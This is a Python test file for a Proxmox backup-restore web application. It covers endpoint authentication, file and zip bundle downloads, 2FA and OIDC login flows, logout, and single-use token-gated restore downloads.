    with TestClient(main.app) as c:
        resp = c.get(
            "/api/restore-original-path",
            params={"type": "vm", "vmid": "133", "volume": "vol"},
            follow_redirects=False,
        )
    assert resp.status_code == 401


def test_restore_browse_requires_auth():
    with TestClient(main.app) as c:
        resp = c.get("/api/restore-browse", params={"type": "vm", "vmid": "133"}, follow_redirects=False)
    assert resp.status_code in (302, 401)


def test_download_streams_with_content_disposition(client, monkeypatch):
    class FakeResponse:
        def __init__(self):
            self.headers = {"content-type": "application/octet-stream"}

        async def aiter_bytes(self):
            yield b"hello "
            yield b"world"

        async def aclose(self):
            pass

    class FakeClient:
        async def aclose(self):
            pass

    async def fake_open(session, volume, filepath, tar=False):
        return FakeClient(), FakeResponse()

    monkeypatch.setattr(pve_client, "open_download", fake_open)
    resp = client.get("/api/download", params={"volume": "v", "filepath": "f", "name": "out.txt"})
    assert resp.status_code == 200
    assert resp.content == b"hello world"
    assert 'filename="out.txt"' in resp.headers["content-disposition"]


def test_download_bundle_rejects_unknown_format(client):
    resp = client.get("/api/download-bundle", params={"volume": "v", "item": ["{}"], "format": "rar"})
    assert resp.status_code == 400


def test_download_bundle_builds_zip(client, monkeypatch):
    async def fake_open(session, volume, filepath, tar=False):
        class FakeResponse:
            async def aread(self):
                return b"file-content"

            async def aclose(self):
                pass

        class FakeClient:
            async def aclose(self):
                pass

        return FakeClient(), FakeResponse()

    monkeypatch.setattr(pve_client, "open_download", fake_open)
    item = '{"filepath": "abc", "name": "a.txt", "leaf": true}'
    resp = client.get(
        "/api/download-bundle",
        params={"volume": "v", "item": [item], "name": "bundle", "format": "zip"},
    )
    assert resp.status_code == 200
    with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
        assert zf.namelist() == ["a.txt"]
        assert zf.read("a.txt") == b"file-content"


def test_download_bundle_directory_entries_are_not_double_prefixed(client, monkeypatch):
    # Confirmed live 2026-09-02 (in the sibling restore-to-guest code
    # path, restore_bundle.py): PVE's own zip for a directory selection
    # already roots every entry under the directory's own name, so
    # re-prefixing with item_name on top of that doubles it
    # ("Downloads/Downloads/..."). This endpoint had the same bug.
    dir_zip_buf = io.BytesIO()
    with zipfile.ZipFile(dir_zip_buf, mode="w") as zf:
        zf.writestr("Downloads/photo.jpg", b"family photo bytes")

    async def fake_open(session, volume, filepath, tar=False):
        class FakeResponse:
            async def aread(self):
                return dir_zip_buf.getvalue()

            async def aclose(self):
                pass

        class FakeClient:
            async def aclose(self):
                pass

        return FakeClient(), FakeResponse()

    monkeypatch.setattr(pve_client, "open_download", fake_open)
    item = '{"filepath": "abc", "name": "Downloads", "leaf": false}'
    resp = client.get(
        "/api/download-bundle",
        params={"volume": "v", "item": [item], "name": "bundle", "format": "zip"},
    )
    assert resp.status_code == 200
    with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
        assert zf.namelist() == ["Downloads/photo.jpg"]
        assert zf.read("Downloads/photo.jpg") == b"family photo bytes"


def test_login_page_always_has_a_realm_option(monkeypatch):
    # list_realms() owns its own failure handling now (issue #31): it
    # retries, then returns the pam/pve fallback rather than raising or
    # returning an empty list, so login_page never renders an empty
    # <select> (which the browser would omit from the POST).
    async def fallback():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "list_realms", fallback)
    with TestClient(main.app) as c:
        resp = c.get("/login")
    assert resp.status_code == 200
    assert 'value="pam"' in resp.text
    assert 'value="pve"' in resp.text


def test_login_submit_invalid_credentials(monkeypatch):
    from fastapi import HTTPException

    async def bad_login(username, password):
        raise HTTPException(status_code=401, detail="Invalid username or password")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "login", bad_login)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.post("/login", data={"username": "x", "realm": "pam", "password": "y"})
    assert resp.status_code == 401
    assert "Invalid username or password" in resp.text


def test_login_submit_fails_cleanly_when_pve_is_unreachable(monkeypatch):
    """Issue #98/#99: a transport-level failure (PVE unreachable, TLS
    verification failure, DNS) isn't an HTTPException and used to
    propagate as an unhandled 500 with zero indication of the real
    cause. login_submit was rewritten from scratch by #15's 2FA work
    before #99 merged, which carried the fix itself forward but dropped
    this regression test along the way - added back here directly
    against current main rather than resolving #99's now-conflicting
    diff, since the code it tests is already shipped."""

    async def unreachable_login(username, password):
        raise httpx.ConnectError("Connection refused")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "login", unreachable_login)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.post("/login", data={"username": "x", "realm": "pam", "password": "y"})
    assert resp.status_code == 502
    assert "Could not reach PVE" in resp.text


def test_login_submit_success_sets_cookie(monkeypatch):
    async def ok_login(username, password):
        assert username == "x@pam"
        return "session-abc"

    monkeypatch.setattr(auth, "login", ok_login)
    with TestClient(main.app) as c:
        resp = c.post(
            "/login",
            data={"username": "x", "realm": "pam", "password": "y"},
            follow_redirects=False,
        )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/"
    assert "session_id=session-abc" in resp.headers["set-cookie"]


def test_login_submit_shows_code_entry_step_when_2fa_required(monkeypatch):
    """Issue #15, step 1: a NeedTFA account gets the code-entry form back,
    not an error - and the response must carry the challenge forward,
    since this route keeps no server-side state for a login still in
    progress. Critically, the hidden username field must be PVE's own
    fully-qualified username from the TFARequired exception ("x@pam"),
    not the raw typed username ("x") - PVE's challenge ticket is
    cryptographically bound to the exact string it returned (AAD in its
    own assemble_ticket call), so resending anything else fails the
    second call even with the right code. A real live-reported bug: this
    field used to echo back the raw form value instead."""

    async def needs_tfa(username, password):
        raise auth.TFARequired(challenge="!tfa!blob", username="x@pam")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "login", needs_tfa)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.post("/login", data={"username": "x", "realm": "pam", "password": "y"})
    assert resp.status_code == 200
    assert "Two-factor authentication" in resp.text
    assert 'value="!tfa!blob"' in resp.text
    assert 'name="username" value="x@pam"' in resp.text
    assert 'name="realm" value="pam"' in resp.text


def test_login_submit_completes_2fa_and_sets_cookie(monkeypatch):
    """Issue #15, step 2: the code-entry form's own POST is distinguished
    by tfa_challenge being present, and completes the login via
    finish_tfa_login - the original password is never sent again."""

    async def finish(username, code, challenge):
        assert username == "x@pam"
        assert code == "123456"
        assert challenge == "!tfa!blob"
        return "session-2fa"

    monkeypatch.setattr(auth, "finish_tfa_login", finish)
    with TestClient(main.app) as c:
        resp = c.post(
            "/login",
            # "x@pam" simulates the hidden field as the template actually
            # renders it (PVE's own fully-qualified username, not a raw
            # "x" reconstructed with realm) - see login_submit's docstring.
            data={"username": "x@pam", "realm": "pam", "password": "123456", "tfa_challenge": "!tfa!blob"},
            follow_redirects=False,
        )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/"
    assert "session_id=session-2fa" in resp.headers["set-cookie"]


def test_login_submit_bad_2fa_code_stays_on_code_entry_step(monkeypatch):
    from fastapi import HTTPException

    async def bad_code(username, code, challenge):
        raise HTTPException(status_code=401, detail="Invalid authentication code")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "finish_tfa_login", bad_code)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.post(
            "/login",
            data={"username": "x@pam", "realm": "pam", "password": "000000", "tfa_challenge": "!tfa!blob"},
        )
    assert resp.status_code == 401
    assert "Invalid authentication code" in resp.text
    # Stays on the code-entry step rather than bouncing back to
    # username/password - the challenge is still valid, only the code was wrong.
    assert "Two-factor authentication" in resp.text
    assert 'value="!tfa!blob"' in resp.text


def test_login_oidc_start_redirects_to_the_returned_auth_url(monkeypatch):
    captured = {}

    async def fake_auth_url(realm, redirect_url):
        captured["realm"] = realm
        captured["redirect_url"] = redirect_url
        return "https://idp.example.com/authorize?client_id=x&state=y"

    monkeypatch.setattr(auth, "oidc_auth_url", fake_auth_url)
    with TestClient(main.app) as c:
        resp = c.get("/login/oidc/keycloak", follow_redirects=False)
    assert resp.status_code == 302
    assert resp.headers["location"] == "https://idp.example.com/authorize?client_id=x&state=y"
    assert captured["realm"] == "keycloak"
    assert captured["redirect_url"].endswith("/login/oidc/callback")


def test_login_oidc_start_shows_an_error_when_pve_rejects_the_realm(monkeypatch):
    from fastapi import HTTPException

    async def fake_auth_url(realm, redirect_url):
        raise HTTPException(status_code=401, detail="nope")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "oidc_auth_url", fake_auth_url)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.get("/login/oidc/bogus")
    assert resp.status_code == 502
    assert "Could not start SSO login" in resp.text


def test_login_oidc_callback_sets_cookie_on_success(monkeypatch):
    captured = {}

    async def fake_oidc_login(state, code, redirect_url):
        captured["state"] = state
        captured["code"] = code
        captured["redirect_url"] = redirect_url
        return "session-oidc-1"

    monkeypatch.setattr(auth, "oidc_login", fake_oidc_login)
    with TestClient(main.app) as c:
        resp = c.get(
            "/login/oidc/callback",
            params={"state": "st1", "code": "cd1"},
            follow_redirects=False,
        )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/"
    assert "session_id=session-oidc-1" in resp.headers["set-cookie"]
    assert captured == {"state": "st1", "code": "cd1", "redirect_url": captured["redirect_url"]}
    assert captured["redirect_url"].endswith("/login/oidc/callback")


def test_login_oidc_callback_handles_identity_provider_denial(monkeypatch):
    # Standard OAuth2 error response (user cancelled, misconfigured
    # client) - `error`/`error_description`, not `code`/`state`. Must not
    # 422/KeyError on a missing `code`.
    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.get(
            "/login/oidc/callback",
            params={"error": "access_denied", "error_description": "user cancelled"},
        )
    assert resp.status_code == 401
    assert "user cancelled" in resp.text


def test_login_oidc_callback_fails_cleanly_when_pve_rejects_the_exchange(monkeypatch):
    from fastapi import HTTPException

    async def fake_oidc_login(state, code, redirect_url):
        raise HTTPException(status_code=401, detail="nope")

    async def realms():
        return [dict(r) for r in auth._FALLBACK_REALMS]

    monkeypatch.setattr(auth, "oidc_login", fake_oidc_login)
    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.get("/login/oidc/callback", params={"state": "st1", "code": "cd1"})
    assert resp.status_code == 401
    assert "SSO login failed" in resp.text


def test_logout_clears_cookie_and_session(session_data):
    auth._sessions["session-xyz"] = session_data
    with TestClient(main.app) as c:
        c.cookies.set("session_id", "session-xyz")
        resp = c.get("/logout", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/login"
    assert "session-xyz" not in auth._sessions


# --- Design C download endpoint (docs/plan.md §7.6, issue #22) -----------
# Not yet reachable from a live restore - these exercise the endpoint
# directly with a job created straight through the manager and a token
# minted straight through restore_download, the way a future bootstrap
# script's fetch would eventually reach it.


def _make_download_job(session_data):
    from backend import restore_jobs

    return restore_jobs.manager.create(
        session=session_data,
        guest_type="vm",
        vmid="133",
        guest_label="web (133)",
        task_name="Restore hosts -> /etc/hosts",
        snapshot_time="2026-08-30T14:48:06Z",
        source_volume="pbs:backup/vm/133/2026-08-30T14:48:06Z",
        source_filepath="L2V0Yy9ob3N0cw==",
        source="/etc/hosts",
        destination="/etc/hosts",
    )


def test_restore_download_fetch_requires_no_auth_but_a_valid_token(session_data, monkeypatch):
    """The endpoint is deliberately unauthenticated - the guest has no
    PVE session - so this uses a bare TestClient with no session cookie
    at all, unlike the other tests here."""
    from backend import restore_download

    job = _make_download_job(session_data)
    token = restore_download.mint_token(job.id, ttl_seconds=60)

    async def fake_open_download(session, volume, filepath, tar=False):
        assert session is job.session
        return httpx.AsyncClient(), httpx.Response(200, content=b"hello world", headers={"content-type": "text/plain"})

    monkeypatch.setattr(pve_client, "open_download", fake_open_download)
    with TestClient(main.app) as c:
        resp = c.get(f"/api/restore-downloads/{token}")
    assert resp.status_code == 200
    assert resp.content == b"hello world"


def test_restore_download_fetch_serves_local_file_for_a_bundle_restore(session_data, monkeypatch, tmp_path):
    # 2026-09-02, docs/plan.md §7.7: a bundle's Direct Network Transfer
    # mints a token with local_path set - the endpoint must stream that
    # file straight off disk, never touching PVE at all.
    from backend import restore_download

    job = _make_download_job(session_data)
    bundle_path = tmp_path / "bundle.tar.gz"
    bundle_path.write_bytes(b"bundle content" * 100)
    token = restore_download.mint_token(job.id, ttl_seconds=60, local_path=str(bundle_path))

    def fail_if_called(*args, **kwargs):
        raise AssertionError("should never call PVE's own download API for a local-path token")

    monkeypatch.setattr(pve_client, "open_download", fail_if_called)
    with TestClient(main.app) as c:
        resp = c.get(f"/api/restore-downloads/{token}")
    assert resp.status_code == 200
    assert resp.content == b"bundle content" * 100


def test_restore_download_fetch_unknown_token_404s():
    with TestClient(main.app) as c:
        resp = c.get("/api/restore-downloads/not-a-real-token")
    assert resp.status_code == 404


def test_restore_download_fetch_is_single_use(session_data, monkeypatch):
    from backend import restore_download

    job = _make_download_job(session_data)
    token = restore_download.mint_token(job.id, ttl_seconds=60)

    async def fake_open_download(session, volume, filepath, tar=False):
        return httpx.AsyncClient(), httpx.Response(200, content=b"hello world", headers={"content-type": "text/plain"})

    monkeypatch.setattr(pve_client, "open_download", fake_open_download)
    with TestClient(main.app) as c:
        first = c.get(f"/api/restore-downloads/{token}")
        second = c.get(f"/api/restore-downloads/{token}")
    assert first.status_code == 200
    assert second.status_code == 404


def test_restore_download_fetch_404s_if_the_job_no_longer_exists(session_data):
    from backend import restore_download, restore_jobs

    job = _make_download_job(session_data)
    token = restore_download.mint_token(job.id, ttl_seconds=60)
    restore_jobs.manager.clear()  # job gone, token still "valid" on its own terms

    with TestClient(main.app) as c:
        resp = c.get(f"/api/restore-downloads/{token}")
    assert resp.status_code == 404
